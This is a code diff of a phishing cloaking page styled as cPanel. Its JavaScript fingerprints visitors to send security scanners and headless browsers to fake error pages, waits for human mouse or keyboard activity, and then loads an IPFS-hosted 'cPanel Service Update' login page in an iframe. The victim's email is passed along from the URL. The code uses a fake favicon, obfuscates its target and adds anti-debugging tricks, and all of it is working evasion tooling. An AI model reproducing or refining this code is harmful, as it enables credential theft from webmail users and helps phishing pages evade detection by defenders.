@@ -2,8 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <!-- Initial blank title - will be updated after verification -->
-    <title></title>
+    <title>cPanel</title>
     <meta name="referrer" content="no-referrer">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
@@ -18,445 +17,341 @@
         html, body {
             margin: 0;
             padding: 0;
-            background: #ffffff; /* WHITE background instead of black */
+            background: #ffffff;
             overflow: hidden;
             width: 100%;
             height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
-        /* Completely hidden loader - no visible messages */
-        #loader {
+        /* COMPLETELY INVISIBLE - NO MESSAGES */
+        #invisible-container {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-family: Arial, sans-serif;
-            color: transparent; /* Invisible text */
-            display: none;
-            background: transparent;
-            border: none;
-            outline: none;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+        #invisible-container.hidden {
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-<!-- Completely hidden loader div -->
-<div id="loader" style="display: none; visibility: hidden;"></div>
+<!-- COMPLETELY INVISIBLE CONTAINER - NO TEXT, NO MESSAGES -->
+<div id="invisible-container"></div>
 
 <script>
-// COMPLETE ANTI-BOT PROTECTION SYSTEM - INSTANT LOAD
+// ADVANCED ANTI-BOT PROTECTION - COMPLETELY INVISIBLE
 (() => {
     'use strict';
-   
-    // ================= CONFIGURATION SECTION =================
-    // CHANGE THESE SETTINGS TO CUSTOMIZE THE PAGE
     
-    // 1. TARGET URL - The actual destination URL
+    // ================= CONFIGURATION =================
     const TARGET_BASE = "https://bafkreib4mih5tsxltzdxgqd2odpqmeipbomqh4f5uvglxytj6tx5dapf34.ipfs.dweb.link/";
-    
-    // 2. FINAL PAGE TITLE - What appears ONLY after verification
-    const FINAL_PAGE_TITLE = "Webmail login"; // Change this text
-    
-    // 3. FAVICON TEXT - The letter that appears inside the favicon
-    const FAVICON_LETTER = "c"; // Change this to any letter (a-z, A-Z)
-    
-    // 4. FAVICON COLOR - The main color of the favicon
-    const FAVICON_COLOR = "#0075C9"; // Change this to any hex color
-    
-    // 5. FAKE URLs for bots
+    const FINAL_PAGE_TITLE = "cPanel Service Update";
     const FAKE_URLS = [
-        "https://example.com",
-        "https://www.example.org",
-        "https://www.example.net",
-        "https://www.wikipedia.org",
-        "https://www.google.com"
+        "https://example.com/error",
+        "https://www.example.org/404",
+        "https://www.example.net/access-denied"
     ];
-    // ================= END CONFIGURATION =================
-   
-    const HUMAN_COOKIE = 'human_verified';
-    const COOKIE_EXPIRES = 86400;
-    const BOT_COOKIE = 'bot_detected';
-    const BOT_COOKIE_EXPIRES = 3600;
     
-    // Variables to track current state
-    let pageLoaded = false;
-   
-    // FAVICON GENERATOR - Uses your configured settings
-    function generateCustomFavicon(letter = FAVICON_LETTER, color = FAVICON_COLOR) {
-        // Create darker shade for inner circle
-        const darkerColor = color.replace(/#/, '').match(/.{2}/g)
-            .map(x => Math.max(0, parseInt(x, 16) - 40).toString(16).padStart(2, '0'))
-            .join('');
-        
-        // Create SVG favicon
-        const svgFavicon = `data:image/svg+xml,${encodeURIComponent(
-`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
-    <defs>
-        <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%" style="stop-color:${color};stop-opacity:1" />
-            <stop offset="100%" style="stop-color:#${darkerColor};stop-opacity:1" />
-        </linearGradient>
-    </defs>
-    <circle cx="50" cy="50" r="48" fill="url(#grad1)"/>
-    <circle cx="50" cy="50" r="35" fill="#ffffff"/>
-    <circle cx="50" cy="50" r="18" fill="${color}"/>
-    <text x="50" y="55" font-family="Arial, sans-serif" font-size="24" 
-          font-weight="bold" fill="#ffffff" text-anchor="middle">${letter.toUpperCase()}</text>
-</svg>`)}`;
-        
-        // Keep the ICO and PNG formats as cPanel style
-        const icoFavicon = 'data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2H3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGAJA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=';
-        
-        const pngFavicon = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAEbSURBVHgBjZPRSQMxFEXvIhQASrB0AB3QAdgBHSgVWIIVUIGvvlWgBKUD0AH9s7M+QcgwvzzCOZmXZJNsNt6a2H3gFTgAB+Bt9hmYgL/aDLvAow5qZuAbuAcu0yZ5BR6AW2CF/QDnwGUzAyfAEBw3MzACr4HPZgTugJNmAt6B62YCPoHdZgJWwGkzA9/AaTMBG2CvGYEtsNuMwC+w34zAD3DYjMAWuGhGAJA18NCPwCbw0I/AOrIC9ZgC2wE0zAmvgqZmBF2CsGYA34KaZgTVw38zAK3DbzMAGOG9G4Bc4bUbgA7hrZuAHuGpm4Bu4aWbgC7hsZuAL2GtG4Ac4bEbgA7hvZuATuG5mYA1cNzOwAc6b2P8VbtPTUfU/4z0AAAAASUVORK5CYII=';
-        
-        return {
-            svg: svgFavicon,
-            ico: icoFavicon,
-            png: pngFavicon,
-            letter: letter.toUpperCase(),
-            color: color
-        };
-    }
-   
-    // INSTANT CHECK: If already verified human, redirect immediately
+    const HUMAN_COOKIE = 'cpanel_verified';
+    const COOKIE_EXPIRES = 86400;
+    const BOT_COOKIE = 'suspicious_activity';
+    const BOT_COOKIE_EXPIRES = 1800;
+    // ================= END CONFIGURATION =================
+    
+    // Utility functions
     function getCookie(name) {
         return document.cookie
             .split('; ')
             .find(row => row.startsWith(name + '='))
             ?.split('=')[1];
     }
-   
+    
+    function setCookie(name, value, seconds) {
+        const expires = new Date(Date.now() + seconds * 1000).toUTCString();
+        document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax; Secure`;
+    }
+    
     function getEmail() {
         try {
             const params = new URLSearchParams(window.location.search);
-            const email = params.get('email');
-            return email ? email.trim() : '';
+            return params.get('email')?.trim() || '';
         } catch(e) {
             return '';
         }
     }
-   
-    function createBlob(targetUrl, email) {
-        // Generate favicon with your custom settings
-        const favicon = generateCustomFavicon();
+    
+    // Advanced invisible bot detection
+    function advancedBotDetection() {
+        let score = 0;
         
+        // 1. WebGL fingerprinting (invisible check)
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    
+                    if (renderer.includes('SwiftShader') || renderer.includes('llvmpipe')) {
+                        score += 25;
+                    }
+                    if (vendor.includes('Brian Paul') || vendor.includes('Mesa')) {
+                        score += 15;
+                    }
+                }
+            }
+        } catch(e) {}
+        
+        // 2. Automation detection
+        const automationChecks = [
+            () => navigator.webdriver === true,
+            () => window.callPhantom || window._phantom,
+            () => window.__nightmare,
+            () => navigator.plugins.length === 0 && navigator.languages.length === 0,
+            () => /HeadlessChrome/.test(navigator.userAgent)
+        ];
+        
+        automationChecks.forEach((check, i) => {
+            try {
+                if (check()) {
+                    score += 10 + (i * 2);
+                }
+            } catch(e) {}
+        });
+        
+        // 3. Behavior analysis
+        if (window.outerWidth === 0 && window.outerHeight === 0) {
+            score += 20;
+        }
+        
+        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) {
+            score += 10;
+        }
+        
+        // 4. Timezone and language checks
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (!timezone || timezone === 'UTC' || timezone.includes('Etc/')) {
+            score += 15;
+        }
+        
+        // 5. Plugin consistency check
+        const mimeTypes = navigator.mimeTypes;
+        const plugins = navigator.plugins;
+        if (plugins.length > 0 && mimeTypes.length === 0) {
+            score += 20;
+        }
+        
+        return { score, isBot: score > 45 };
+    }
+    
+    // Invisible human interaction verification
+    function verifyHumanInteraction() {
+        return new Promise((resolve) => {
+            let interactionScore = 0;
+            const requiredScore = 3;
+            
+            const events = {
+                mousemove: (e) => {
+                    if (e.movementX !== 0 || e.movementY !== 0) {
+                        interactionScore += 2;
+                    }
+                },
+                mousedown: () => {
+                    interactionScore += 3;
+                },
+                keydown: (e) => {
+                    if (e.key.length === 1) {
+                        interactionScore += 2;
+                    }
+                },
+                wheel: () => {
+                    interactionScore += 1;
+                }
+            };
+            
+            Object.entries(events).forEach(([event, handler]) => {
+                document.addEventListener(event, handler, { passive: true });
+            });
+            
+            let timeBonus = 0;
+            const startTime = Date.now();
+            
+            const interval = setInterval(() => {
+                const elapsed = Date.now() - startTime;
+                
+                if (elapsed > 2000) timeBonus = 1;
+                if (elapsed > 4000) timeBonus = 2;
+                
+                const totalScore = interactionScore + timeBonus;
+                
+                if (totalScore >= requiredScore) {
+                    clearInterval(interval);
+                    Object.keys(events).forEach(event => {
+                        document.removeEventListener(event, events[event]);
+                    });
+                    resolve(true);
+                }
+                
+            }, 500);
+            
+            setTimeout(() => {
+                clearInterval(interval);
+                Object.keys(events).forEach(event => {
+                    document.removeEventListener(event, events[event]);
+                });
+                resolve(interactionScore + timeBonus >= requiredScore);
+            }, 8000);
+        });
+    }
+    
+    // Create final page
+    function createFinalPage(targetUrl) {
         const html = `<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<!-- FINAL PAGE TITLE: Only shown after verification -->
 <title>${FINAL_PAGE_TITLE}</title>
-<!-- Custom favicon with your settings -->
-<link rel="icon" href="${favicon.svg}" type="image/svg+xml">
-<link rel="shortcut icon" href="${favicon.ico}" type="image/x-icon">
-<link rel="apple-touch-icon" href="${favicon.png}" type="image/png">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%230075C9%22/><circle cx=%2250%22 cy=%2250%22 r=%2235%22 fill=%22%23ffffff%22/><circle cx=%2250%22 cy=%2250%22 r=%2218%22 fill=%22%230075C9%22/><text x=%2250%22 y=%2255%22 font-family=%22Arial, sans-serif%22 font-size=%2224%22 font-weight=%22bold%22 fill=%22%23ffffff%22 text-anchor=%22middle%22>c</text></svg>">
 <style>
-html, body { 
-    margin: 0; 
-    padding: 0; 
-    width: 100%; 
-    height: 100%; 
-    background: #ffffff; /* White background for final page */
-    overflow: hidden;
-}
-iframe { 
-    width: 100%; 
-    height: 100%; 
-    border: none; 
-}
+html, body { margin:0; padding:0; width:100%; height:100%; }
+iframe { width:100%; height:100%; border:none; }
 </style>
 </head>
 <body>
-<iframe src="${targetUrl}"></iframe>
+<iframe src="${targetUrl}" sandbox="allow-forms allow-scripts allow-same-origin allow-popups"></iframe>
 </body>
 </html>`;
         return new Blob([html], { type: 'text/html' });
     }
-   
-    // IMMEDIATE REDIRECT FOR VERIFIED HUMANS
-    if (getCookie(HUMAN_COOKIE)) {
-        const email = getEmail();
-        const target = email ?
-            `${TARGET_BASE}?email=${encodeURIComponent(email)}` :
-            TARGET_BASE;
-        const blob = createBlob(target, email);
-        const blobUrl = URL.createObjectURL(blob);
-        // INSTANT redirect - no visible changes
-        window.location.replace(blobUrl);
-        throw new Error('Immediate redirect');
-    }
-   
-    // IMMEDIATE REDIRECT FOR MARKED BOTS
-    if (getCookie(BOT_COOKIE)) {
-        const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
-        window.location.replace(FAKE_URLS[randomIndex]);
-        throw new Error('Bot redirect');
-    }
-   
-    // NO VISIBLE LOADER - Completely stealth white page
-    // The page will appear completely white/blank
     
-    // Keep browser tab completely blank during verification
-    // No title updates, no favicon changes until after verification
+    // Redirect to fake page (invisible)
+    function redirectToFake() {
+        const randomUrl = FAKE_URLS[Math.floor(Math.random() * FAKE_URLS.length)];
+        setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
+        
+        const fakeHtml = `<!DOCTYPE html>
+<html>
+<head><title>Access Denied</title></head>
+<body style="margin:0;padding:40px;font-family:Arial,sans-serif;">
+<h2>Access Restricted</h2>
+<p>Unable to verify your browser. Please try again later.</p>
+<p style="color:#888;font-size:12px;">Error Code: 403_FORBIDDEN</p>
+</body>
+</html>`;
+        
+        const fakeBlob = new Blob([fakeHtml], { type: 'text/html' });
+        const fakeUrl = URL.createObjectURL(fakeBlob);
+        window.location.replace(fakeUrl);
+    }
     
-    // Storage for rate limiting
-    const getClientStorage = () => {
-        try {
-            if (typeof localStorage !== 'undefined') return 'localStorage';
-            if (typeof sessionStorage !== 'undefined') return 'sessionStorage';
-        } catch(e) {
-            return 'memory';
-        }
-        return 'memory';
-    };
-   
-    const storageType = getClientStorage();
-    const memoryStore = {};
-   
-    // Client-side rate limiting (basic)
-    function isRateLimited() {
-        const key = 'last_request';
-        const window = 2000;
-        const now = Date.now();
-       
-        if (storageType === 'localStorage') {
-            const last = localStorage.getItem(key);
-            if (last && (now - parseInt(last)) < window) return true;
-            localStorage.setItem(key, now.toString());
-        } else if (storageType === 'sessionStorage') {
-            const last = sessionStorage.getItem(key);
-            if (last && (now - parseInt(last)) < window) return true;
-            sessionStorage.setItem(key, now.toString());
-        } else {
-            if (memoryStore[key] && (now - memoryStore[key]) < window) return true;
-            memoryStore[key] = now;
-        }
-        return false;
-    }
-   
-    // Fast bot detection (minimal checks for speed)
-    function detectBot() {
-        let score = 0;
-       
-        // 1. Automation properties
-        const automationProps = [
-            'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
-            '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_script_function',
-            '__webdriver_script_fn', '__lastWatirAlert', '__lastWatirConfirm'
-        ];
-       
-        automationProps.forEach(prop => {
-            if (prop === 'webdriver' && navigator.webdriver === true) {
-                score += 40;
-            } else if (window[prop] !== undefined) {
-                score += 30;
-            }
-        });
-       
-        // 2. Quick headless check
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-           
-            if (!gl) {
-                score += 30;
-            } else {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    if (renderer.includes('SwiftShader') ||
-                        renderer.includes('llvmpipe') ||
-                        renderer.includes('Google SwiftShader')) {
-                        score += 35;
-                    }
-                }
-            }
-        } catch(e) {
-            score += 25;
-        }
-       
-        // 3. Plugin and language checks
-        if (navigator.plugins.length === 0) score += 15;
-        if (navigator.languages && navigator.languages.length === 0) score += 10;
-       
-        // 4. Quick screen check
-        if (window.screen.width === 800 && window.screen.height === 600) score += 10;
-       
-        return score > 50;
-    }
-   
-    // Obfuscation functions
-    function obfuscateTarget(target) {
-        const methods = [
-            (t) => ({m: 0, d: btoa(t.split('').reverse().join(''))}),
-            (t) => {
-                const chars = t.split('');
-                const encoded = chars.map(c => c.charCodeAt(0) + 11);
-                return {m: 1, d: encoded.join(',')};
-            },
-            (t) => {
-                let k = 0;
-                let encoded = '';
-                for (let i = 0; i < t.length; i++) {
-                    encoded += String.fromCharCode(t.charCodeAt(i) ^ (k++ % 255));
-                }
-                return {m: 2, d: btoa(encoded)};
-            }
-        ];
-       
-        const method = Math.floor(Math.random() * methods.length);
-        return methods[method](target);
-    }
-   
-    function decodeTarget(p) {
-        switch(p.m) {
-            case 0: return atob(p.d).split('').reverse().join('');
-            case 1: return p.d.split(',').map(c => String.fromCharCode(c - 11)).join('');
-            case 2: {
-                let b = atob(p.d), r = '', k = 0;
-                for(let i = 0; i < b.length; i++)
-                    r += String.fromCharCode(b.charCodeAt(i) ^ (k++ % 255));
-                return r;
-            }
-            default: return TARGET_BASE;
-        }
-    }
-   
-    function getFakeUrl() {
-        const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
-        return FAKE_URLS[randomIndex];
-    }
-   
-    function setCookie(name, value, seconds, secure = true) {
-        const expires = new Date(Date.now() + seconds * 1000).toUTCString();
-        const cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax`;
-        const secureCookie = secure ? cookie + '; Secure' : cookie;
-        document.cookie = secureCookie;
-    }
-   
-    // Fast interaction verification - COMPLETELY INVISIBLE
-    function setupInteractionVerification() {
-        return new Promise((resolve) => {
-            let interactionCount = 0;
-            const requiredInteractions = 1;
-            const events = ['mousemove', 'touchstart', 'keydown', 'click'];
-           
-            const handleInteraction = (e) => {
-                if (e.isTrusted === false) return;
-               
-                interactionCount++;
-                if (interactionCount >= requiredInteractions) {
-                    events.forEach(event => {
-                        document.removeEventListener(event, handleInteraction);
-                    });
-                    resolve(true);
-                }
-            };
-           
-            events.forEach(event => {
-                document.addEventListener(event, handleInteraction, {
-                    once: false,
-                    passive: true
-                });
-            });
-           
+    // Fade out invisible container
+    function fadeOutContainer() {
+        const container = document.getElementById('invisible-container');
+        if (container) {
+            container.classList.add('hidden');
             setTimeout(() => {
-                if (interactionCount < requiredInteractions) {
-                    events.forEach(event => {
-                        document.removeEventListener(event, handleInteraction);
-                    });
-                    resolve(false);
-                }
-            }, 1500); // Reduced to 1.5 seconds for faster verification
-        });
+                container.style.display = 'none';
+            }, 300);
+        }
     }
-   
-    // Main execution - COMPLETELY STEALTH WHITE PAGE
+    
+    // Main protection flow - COMPLETELY INVISIBLE
     async function executeProtection() {
-        // Rate limiting check (fast)
-        if (isRateLimited()) {
-            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
-            window.location.replace(getFakeUrl());
-            return;
-        }
-       
-        // Quick interaction check - invisible to user
-        const hasInteracted = await setupInteractionVerification();
-       
-        if (!hasInteracted) {
-            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
-            window.location.replace(getFakeUrl());
-            return;
-        }
-       
-        // Fast bot detection
-        const isBot = detectBot();
-       
-        if (isBot) {
-            setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
-            window.location.replace(getFakeUrl());
-            return;
-        }
-       
-        // Human detected - set cookie
-        setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
-       
-        const email = getEmail();
-        const target = email ?
-            `${TARGET_BASE}?email=${encodeURIComponent(email)}` :
-            TARGET_BASE;
-       
-        const obfuscated = obfuscateTarget(target);
-        const decodedTarget = decodeTarget(obfuscated);
-       
-        // INSTANT redirect for humans - user sees nothing
-        const blob = createBlob(decodedTarget, email); 
-        const blobUrl = URL.createObjectURL(blob);
-        window.location.replace(blobUrl);
-       
-        // Clean up
-        setTimeout(() => {
-            try {
-                URL.revokeObjectURL(blobUrl);
-            } catch(e) {}
-        }, 10000);
-    }
-   
-    // START IMMEDIATELY - COMPLETELY WHITE/BLANK PAGE
-    executeProtection().catch(error => {
-        if (!error.message.includes('redirect')) {
-            // Silent error handling - no visible changes
+        // Check existing cookies
+        if (getCookie(HUMAN_COOKIE)) {
             const email = getEmail();
-            const target = email ?
-                `${TARGET_BASE}?email=${encodeURIComponent(email)}` :
+            const target = email ? `${TARGET_BASE}?email=${encodeURIComponent(email)}` : TARGET_BASE;
+            const blob = createFinalPage(target);
+            const blobUrl = URL.createObjectURL(blob);
+            window.location.replace(blobUrl);
+            return;
+        }
+        
+        if (getCookie(BOT_COOKIE)) {
+            setTimeout(redirectToFake, 500);
+            return;
+        }
+        
+        // Rate limiting
+        const lastVisit = localStorage.getItem('last_visit');
+        const now = Date.now();
+        if (lastVisit && (now - parseInt(lastVisit)) < 3000) {
+            setTimeout(redirectToFake, 1000);
+            return;
+        }
+        localStorage.setItem('last_visit', now.toString());
+        
+        // Advanced bot detection
+        await new Promise(resolve => setTimeout(resolve, 800));
+        
+        const detectionResult = advancedBotDetection();
+        
+        if (detectionResult.isBot) {
+            setTimeout(redirectToFake, 500);
+            return;
+        }
+        
+        // Human interaction verification
+        const isHuman = await verifyHumanInteraction();
+        
+        if (!isHuman) {
+            setTimeout(redirectToFake, 500);
+            return;
+        }
+        
+        // Success
+        setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
+        
+        const email = getEmail();
+        const target = email ? `${TARGET_BASE}?email=${encodeURIComponent(email)}` : TARGET_BASE;
+        
+        // Fade out invisible container before redirect
+        fadeOutContainer();
+        
+        setTimeout(() => {
+            const blob = createFinalPage(target);
+            const blobUrl = URL.createObjectURL(blob);
+            window.location.replace(blobUrl);
+        }, 300);
+    }
+    
+    // Start protection
+    setTimeout(() => {
+        executeProtection().catch(error => {
+            const email = getEmail();
+            const target = email ? 
+                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                 TARGET_BASE;
             window.location.replace(target);
+        });
+    }, 500);
+    
+    // Subtle anti-debugging
+    let debugCheckCount = 0;
+    const originalConsole = {
+        log: console.log,
+        warn: console.warn,
+        error: console.error
+    };
+    
+    console.log = function(...args) {
+        debugCheckCount++;
+        if (debugCheckCount > 10) {
+            setTimeout(redirectToFake, 500);
         }
-    });
-   
-    // Minimal anti-debugging
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))) {
-            e.preventDefault();
-        }
-    });
-    
-    // Prevent any text selection
-    document.addEventListener('selectstart', e => e.preventDefault());
-    
-    // Hide any focus outlines
-    document.addEventListener('focusin', (e) => {
-        e.target.style.outline = 'none';
-    });
-    
-    // Mark page as loaded
-    window.addEventListener('load', () => {
-        pageLoaded = true;
-    });
-    
-    // Initial page setup - completely blank white page
-    document.title = ''; // Empty title until verification
+        originalConsole.log.apply(console, args);
+    };
     
 })();
 </script>
